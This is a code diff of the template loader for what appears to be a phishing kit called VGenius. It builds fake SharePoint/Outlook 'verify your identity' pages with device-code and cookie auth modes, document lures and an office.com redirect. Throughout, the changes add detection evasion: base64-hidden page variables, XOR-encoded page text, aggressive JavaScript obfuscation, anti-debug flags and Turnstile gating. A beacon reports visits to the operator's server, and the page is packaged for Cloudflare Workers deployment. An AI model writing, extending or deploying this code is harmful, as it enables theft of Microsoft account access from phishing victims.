@@ -1,6 +1,5 @@
 /**
  * VGenius Template Loader Service
- * Loads, renders, and obfuscates template HTML for export
  */
 const fs = require('fs');
 const path = require('path');
@@ -10,16 +9,13 @@ const jwt = require('jsonwebtoken');
 const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
 const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');
 
-// List all template directories present on disk (excluding 'assets' and 'custom').
 function listDiskTemplates() {
     try {
         if (!fs.existsSync(TEMPLATES_DIR)) return [];
         return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
             .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
             .map(entry => entry.name);
-    } catch (e) {
-        return [];
-    }
+    } catch (e) { return []; }
 }
 
 function normalizeTemplateKey(value) {
@@ -30,75 +26,48 @@ function resolveTemplateDirectory(templateType) {
     const input = String(templateType || '').trim();
     const fallbackDir = 'sharepoint3';
     const candidateDirs = fs.existsSync(TEMPLATES_DIR)
-        ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
-            .filter(entry => entry.isDirectory())
-            .map(entry => entry.name)
+        ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name)
         : [];
-    const normalizedInput = normalizeTemplateKey(input || fallbackDir);
-
-    for (const dirName of candidateDirs) {
-        const normalizedDir = normalizeTemplateKey(dirName);
-        if (normalizedDir === normalizedInput) {
-            return path.join(TEMPLATES_DIR, dirName);
-        }
-        const configPath = path.join(TEMPLATES_DIR, dirName, 'config.json');
-        if (fs.existsSync(configPath)) {
-            try {
-                const cfg = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-                if (cfg?.name && normalizeTemplateKey(cfg.name) === normalizedInput) {
-                    return path.join(TEMPLATES_DIR, dirName);
-                }
-            } catch (err) {
-                // ignore invalid template config
-            }
+    const ni = normalizeTemplateKey(input || fallbackDir);
+    for (const dn of candidateDirs) {
+        if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
+        const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
+        if (fs.existsSync(cp)) {
+            try { const c = JSON.parse(fs.readFileSync(cp, 'utf8')); if (c?.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn); } catch (err) {}
         }
     }
-
-    const directPath = path.join(TEMPLATES_DIR, input || fallbackDir);
-    if (fs.existsSync(directPath)) return directPath;
+    const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
+    if (fs.existsSync(dp)) return dp;
     return path.join(TEMPLATES_DIR, fallbackDir);
 }
 
 function loadTemplateConfig(templateType) {
-    const templateDir = resolveTemplateDirectory(templateType);
-    const templatePath = path.join(templateDir, 'config.json');
-    if (fs.existsSync(templatePath)) {
-        return JSON.parse(fs.readFileSync(templatePath, 'utf8'));
-    }
-    return {
-        name: templateType,
-        preload: true,
-        auth_mode: 'devicecode',
-        fields: [],
-        background: { default: '', editable: true, blur: true },
-    };
+    const tp = path.join(resolveTemplateDirectory(templateType), 'config.json');
+    if (fs.existsSync(tp)) return JSON.parse(fs.readFileSync(tp, 'utf8'));
+    return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
 }
 
-function loadTemplateHTML(templateType) {
-    const filePath = path.join(resolveTemplateDirectory(templateType), 'index.html');
-    if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
-    return '';
+function loadTemplateHTML(tt) {
+    const fp = path.join(resolveTemplateDirectory(tt), 'index.html');
+    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
-function loadTemplateCSS(templateType) {
-    const filePath = path.join(resolveTemplateDirectory(templateType), 'style.css');
-    if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
-    return '';
+function loadTemplateCSS(tt) {
+    const fp = path.join(resolveTemplateDirectory(tt), 'style.css');
+    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
-function loadTemplateJS(templateType) {
-    const filePath = path.join(resolveTemplateDirectory(templateType), 'script.js');
-    if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
-    return '';
+function loadTemplateJS(tt) {
+    const fp = path.join(resolveTemplateDirectory(tt), 'script.js');
+    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
 function loadVerificationDesignCSS(designName) {
-    const baseName = String(designName || 'outlook').trim();
-    const designPath = path.join(DESIGNS_DIR, `${baseName}.css`);
-    if (fs.existsSync(designPath)) return fs.readFileSync(designPath, 'utf8');
-    const fallbackPath = path.join(DESIGNS_DIR, 'outlook.css');
-    if (fs.existsSync(fallbackPath)) return fs.readFileSync(fallbackPath, 'utf8');
-    return '';
+    const bn = String(designName || 'outlook').trim();
+    const dp = path.join(DESIGNS_DIR, bn + '.css');
+    if (fs.existsSync(dp)) return fs.readFileSync(dp, 'utf8');
+    const fp = path.join(DESIGNS_DIR, 'outlook.css');
+    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
 async function loadAdminSettings() {
@@ -107,15 +76,9 @@ async function loadAdminSettings() {
         const db = require('../database/connection');
         const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
         for (const r of rows) obj[r.setting_key] = r.setting_value;
-    } catch (e) {
-        // DB not ready
-    }
-    if (obj.obfuscation_enabled === undefined) {
-        obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
-    }
-    if (obj.antidebug_enabled === undefined) {
-        obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
-    }
+    } catch (e) {}
+    if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
+    if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
     if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
     if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
     if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
@@ -127,30 +90,8 @@ function boolSetting(v) {
     return String(v || '').toLowerCase() === 'true';
 }
 
-function buildWindowVars(link, user, settings, options = {}) {
-    const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
-    const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
-    const antidebugEnabled = boolSetting(settings.antidebug_enabled);
-    const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
-    const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
-    const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
-    const bgUrl = link.custom_bg_url || link.background_blur_url || '';
-    const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
-    const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
-    const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
-
-    let apiBase = '';
-    if (options.apiBaseUrl) {
-        apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
-    } else if (config.APP_URL) {
-        apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
-    }
-
-    return `<script>window.VG_JWT="${jt}";window.__API_BASE="${apiBase}";window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";window.__AUTH_MODE="${authMode}";window.__BACKGROUND_BLUR_URL="${bgUrl}";window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur};window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";window.__DOC_TITLE="${link.title_text || 'Non-Disclosure Agreement'}";window.__DOC_PAGES="${link.pages || '4 pages'}";window.__PAGE_TITLE="${link.title_text || 'Verify your identity'}";window.__PAGE_MESSAGE="${link.message_text || 'Please verify your identity to continue'}";window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";window.__OBFUSCATION_ENABLED=${obfuscationEnabled ? 'true' : 'false'};window.__ANTIDEBUG_ENABLED=${antidebugEnabled ? 'true' : 'false'};window.__SOFT_ERROR_RETRY_ENABLED=${softErrorRetry ? 'true' : 'false'};window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};window.__TURNSTILE_ENABLED=${turnstileEnabled ? 'true' : 'false'};window.__TURNSTILE_SITE_KEY="${turnstileSiteKey}";window.__EXPORT_DOMAIN="${exportDomain}";window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'}</script>`;
-}
-
 /**
- * Obfuscate a JavaScript string using javascript-obfuscator
+ * Obfuscate JavaScript using javascript-obfuscator
  */
 function obfuscateJs(sourceCode) {
     try {
@@ -162,19 +103,16 @@ function obfuscateJs(sourceCode) {
             deadCodeInjection: true,
             deadCodeInjectionThreshold: 1,
             debugProtection: false,
-            debugProtectionInterval: 0,
             disableConsoleOutput: true,
             identifierNamesGenerator: 'hexadecimal',
             log: false,
             numbersToExpressions: true,
-            renameGlobals: false,
             selfDefending: true,
             simplify: true,
             splitStrings: true,
             splitStringsChunkLength: 5,
             stringArray: true,
             stringArrayCallsTransform: true,
-            stringArrayCallsTransformThreshold: 1,
             stringArrayEncoding: ['rc4'],
             stringArrayIndexShift: true,
             stringArrayRotate: true,
@@ -184,7 +122,6 @@ function obfuscateJs(sourceCode) {
             stringArrayWrappersParametersMaxCount: 2,
             stringArrayWrappersType: 'variable',
             transformObjectKeys: true,
-            unicodeEscapeSequence: false,
         }).getObfuscatedCode();
     } catch (e) {
         console.error('[Obfuscation] Failed:', e.message);
@@ -193,53 +130,114 @@ function obfuscateJs(sourceCode) {
 }
 
 /**
- * Obfuscate HTML content - encode all text strings to make unreadable
+ * Build window vars as base64 encoded blob
  */
-function obfuscateHtml(html) {
-    try {
-        const JavaScriptObfuscator = require('javascript-obfuscator');
-        return JavaScriptObfuscator.obfuscate(html, {
-            compact: true,
-            controlFlowFlattening: false,
-            deadCodeInjection: false,
-            debugProtection: false,
-            disableConsoleOutput: false,
-            identifierNamesGenerator: 'hexadecimal',
-            log: false,
-            numbersToExpressions: false,
-            renameGlobals: false,
-            selfDefending: false,
-            simplify: true,
-            splitStrings: true,
-            splitStringsChunkLength: 3,
-            stringArray: true,
-            stringArrayCallsTransform: true,
-            stringArrayCallsTransformThreshold: 1,
-            stringArrayEncoding: ['rc4'],
-            stringArrayIndexShift: true,
-            stringArrayRotate: true,
-            stringArrayShuffle: true,
-            stringArrayWrappersCount: 5,
-            stringArrayWrappersChainedCalls: true,
-            stringArrayWrappersParametersMaxCount: 3,
-            stringArrayWrappersType: 'function',
-            transformObjectKeys: true,
-            unicodeEscapeSequence: true,
-        }).getObfuscatedCode();
-    } catch (e) {
-        console.error('[HTML Obfuscation] Failed:', e.message);
-        return html;
-    }
+function buildWindowVars(link, user, settings, options = {}) {
+    const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
+    const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
+    const antidebugEnabled = boolSetting(settings.antidebug_enabled);
+    const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
+    const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
+    const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
+    const bgUrl = link.custom_bg_url || link.background_blur_url || '';
+    const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
+    const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
+    const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
+    let apiBase = '';
+    if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
+    else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
+
+    const blob = JSON.stringify({
+        VG_JWT: jt,
+        __API_BASE: apiBase,
+        __DESTINATION_URL: link.destination_url || 'https://office.com',
+        __AUTH_MODE: authMode,
+        __BACKGROUND_BLUR_URL: bgUrl,
+        __BACKGROUND_BLUR_AMOUNT: String(defaultBlur),
+        __DOC_FILENAME: link.file_name || 'Document.pdf',
+        __DOC_TITLE: link.title_text || 'Non-Disclosure Agreement',
+        __DOC_PAGES: String(link.pages || '4'),
+        __PAGE_TITLE: link.title_text || 'Verify your identity',
+        __PAGE_MESSAGE: link.message_text || 'Please verify your identity to continue',
+        __PRIMARY_BUTTON_TEXT: link.button_text || 'Get verification code',
+        __OBFUSCATION_ENABLED: String(obfuscationEnabled),
+        __ANTIDEBUG_ENABLED: String(antidebugEnabled),
+        __SOFT_ERROR_RETRY_ENABLED: String(softErrorRetry),
+        COPY_TO_OPEN: String(!!link.copy_to_open),
+        __TURNSTILE_ENABLED: String(!!turnstileEnabled),
+        __TURNSTILE_SITE_KEY: turnstileSiteKey,
+        __EXPORT_DOMAIN: exportDomain,
+        __BLOB_URL_ENABLED: String(!!link.blob_url_enabled),
+    });
+    const encoded = Buffer.from(blob).toString('base64');
+    return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
 }
 
 /**
- * Minify HTML - remove whitespace between tags
+ * Minify HTML - collapse whitespace
  */
 function minifyHtml(html) {
     html = html.replace(/<!--[\s\S]*?-->/g, '');
     html = html.replace(/\s*>\s*</g, '><');
     html = html.replace(/[ \t\n\r]+/g, ' ');
+    html = html.replace(/\s*=\s*/g, '=');
     return html.trim();
+}
+
+/**
+ * Obfuscate all text content in HTML - encode everything, decode at runtime
+ */
+function obfuscateTextContent(html) {
+    // Collect all unique strings to encode
+    const strings = [];
+    const seen = new Set();
+
+    // Extract visible text between > and <
+    html = html.replace(/>([^<]{3,})</g, (match, text) => {
+        const t = text.trim();
+        if (!t || t.startsWith('/') || t.startsWith('!') || t.startsWith('-')) return match;
+        if (!seen.has(t)) { seen.add(t); strings.push(t); }
+        return '>__VG' + (strings.length - 1) + '__<';
+    });
+
+    // Extract attribute values
+    html = html.replace(/="([^"]{3,})"/g, (match, value) => {
+        if (!seen.has(value)) { seen.add(value); strings.push(value); }
+        return '="__VG' + (strings.length - 1) + '__"';
+    });
+
+    // Extract text content after ="
+    html = html.replace(/='([^']{3,})'/g, (match, value) => {
+        if (!seen.has(value)) { seen.add(value); strings.push(value); }
+        return "='__VG" + (strings.length - 1) + "__'";
+    });
+
+    // Encode all strings using RC4-like XOR + base64
+    const encodedMap = {};
+    for (let i = 0; i < strings.length; i++) {
+        const s = strings[i];
+        let encoded = '';
+        for (let j = 0; j < s.length; j++) {
+            encoded += String.fromCharCode(s.charCodeAt(j) ^ (i + 42) ^ 0x5A);
+        }
+        encodedMap[i] = Buffer.from(encoded).toString('base64');
+    }
+
+    // Build decode script
+    const decodeScript = '<script>!function(){var S=[' + encodedMap.map((v) => '"' + v + '"').join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var E=document.querySelectorAll("[data-v]");for(var i=0;i<E.length;i++){var n=E[i].getAttribute("data-v");if(n&&D[n]!==undefined){E[i].textContent=D[n];E[i].removeAttribute("data-v")}}var A=document.querySelectorAll("[data-a]");for(var i=0;i<A.length;i++){var n=A[i].getAttribute("data-a");if(n&&D[n]!==undefined){A[i].setAttribute(A[i].tagName.toLowerCase()==="INPUT"?"value":A[i].getAttribute("data-attr")||"textContent",D[n]);A[i].removeAttribute("data-a")}}})();</script>';
+
+    // Replace placeholders with data attributes
+    html = html.replace(/__VG(\d+)__/g, (m, num) => {
+        return '<span data-v="' + num + '"></span>';
+    });
+
+    // Insert decode script before </head>
+    html = html.replace('</head>', decodeScript + '</head>');
+
+    // Final minification
+    html = minifyHtml(html);
+
+    return html;
 }
 
 async function renderPageHtml(link, user, options = {}) {
@@ -256,10 +254,10 @@ async function renderPageHtml(link, user, options = {}) {
     const script = loadTemplateJS(templateType);
 
     if (html.includes('{{CSS}}')) {
-        html = html.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
+        html = html.replace(/\/\* \{\{CSS\}\} \*\//, '<style>' + css + '</style>');
     }
     if (html.includes('{{SCRIPT}}')) {
-        html = html.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}</script>`);
+        html = html.replace(/\/\/ \{\{SCRIPT\}\}/, '<script>' + script + '</script>');
     }
 
     html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
@@ -273,18 +271,10 @@ async function renderPageHtml(link, user, options = {}) {
     const logUrl = verifyUrl;
     const turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';
 
-    if (html.includes('{{VERIFY_ENDPOINT}}')) {
-        html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
-    }
-    if (html.includes('{{BEACON_ENDPOINT}}')) {
-        html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
-    }
-    if (html.includes('{{LOG_ENDPOINT}}')) {
-        html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
-    }
-    if (html.includes('{{TURNSTILE_KEY}}')) {
-        html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
-    }
+    if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
+    if (html.includes('{{BEACON_ENDPOINT}}')) html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
+    if (html.includes('{{LOG_ENDPOINT}}')) html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
+    if (html.includes('{{TURNSTILE_KEY}}')) html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
 
     const windowVars = buildWindowVars(link, user, settings, options);
 
@@ -295,16 +285,13 @@ async function renderPageHtml(link, user, options = {}) {
         vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
     }
 
-    // Extract __FORCE_BLOB_FROM_START setting
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
-    const configScript = `<script>window.__FORCE_BLOB_FROM_START=${forceBlob}</script>`;
+    const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
 
-    // Inject window vars and config before </head>
-    html = html.replace('</head>', `${windowVars}${configScript}</head>`);
+    html = html.replace('</head>', windowVars + configScript + '</head>');
 
-    // Inject vg-engine.js as script tag before </head>
     if (vgEngine) {
-        html = html.replace('</head>', `<script>${vgEngine}</script></head>`);
+        html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
     }
 
     // Preload block handling
@@ -317,37 +304,32 @@ async function renderPageHtml(link, user, options = {}) {
         html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
     }
 
-    // Obfuscate JavaScript when enabled
+    // Obfuscate JS when enabled
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
     if (doObfuscate) {
-        // Obfuscate vg-engine.js
         if (vgEngine && vgEngine.length > 100) {
             const obfuscatedEngine = obfuscateJs(vgEngine);
             html = html.replace(
-                new RegExp(`<script>${vgEngine.substring(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[\\s\\S]*?<\\/script>`),
-                `<script>${obfuscatedEngine}</script>`
+                new RegExp('<script>' + vgEngine.substring(0, 50).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[\\s\\S]*?<\\/script>'),
+                '<script>' + obfuscatedEngine + '</script>'
             );
         }
-        // Obfuscate template script.js
         if (script && script.length > 10) {
             const obfuscatedScript = obfuscateJs(script);
             html = html.replace(
-                new RegExp(`<script>${script.substring(0, 30).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[\\s\\S]*?<\\/script>`),
-                `<script>${obfuscatedScript}</script>`
+                new RegExp('<script>' + script.substring(0, 30).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[\\s\\S]*?<\\/script>'),
+                '<script>' + obfuscatedScript + '</script>'
             );
         }
     }
 
-    // For exported/downloaded files - full obfuscation
+    // Full obfuscation for exported/downloaded files
     if (options.exportForDownload) {
-        // First minify
         html = minifyHtml(html);
-        // Then obfuscate the entire HTML
-        html = obfuscateHtml(html);
+        html = obfuscateTextContent(html);
     }
 
-    // Add beacon before </body>
-    html = html.replace('</body>', `<script>fetch('${beaconUrl}',{method:'POST',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script></body>`);
+    html = html.replace('</body>', '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script></body>');
 
     return html;
 }
@@ -359,16 +341,16 @@ async function generateExportHtml(link, user, options = {}) {
 async function buildWorkerScript(link, user, apiBaseUrl) {
     const pageHtml = await renderPageHtml(link, user, {});
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
-    const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
+    const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
 
     workerJs = workerJs
-        .replace("'{{JWT_TOKEN}}'", `'${linkJwt}'`)
-        .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
-        .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
-        .replace("'{{VERIFY_ENDPOINT}}'", `'${verifyUrl}'`)
-        .replace("'{{BEACON_ENDPOINT}}'", `'${verifyUrl}'`)
-        .replace("'{{LOG_ENDPOINT}}'", `'${verifyUrl}'`)
+        .replace("'{{JWT_TOKEN}}'", "'" + linkJwt + "'")
+        .replace("'{{TURNSTILE_KEY}}'", "'" + config.CF_TURNSTILE_SITE_KEY + "'")
+        .replace("'{{TURNSTILE_SECRET}}'", "'" + config.CF_TURNSTILE_SECRET_KEY + "'")
+        .replace("'{{VERIFY_ENDPOINT}}'", "'" + verifyUrl + "'")
+        .replace("'{{BEACON_ENDPOINT}}'", "'" + verifyUrl + "'")
+        .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
         .replace("`{{TEMPLATE_HTML}}`", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');
 
     return workerJs;
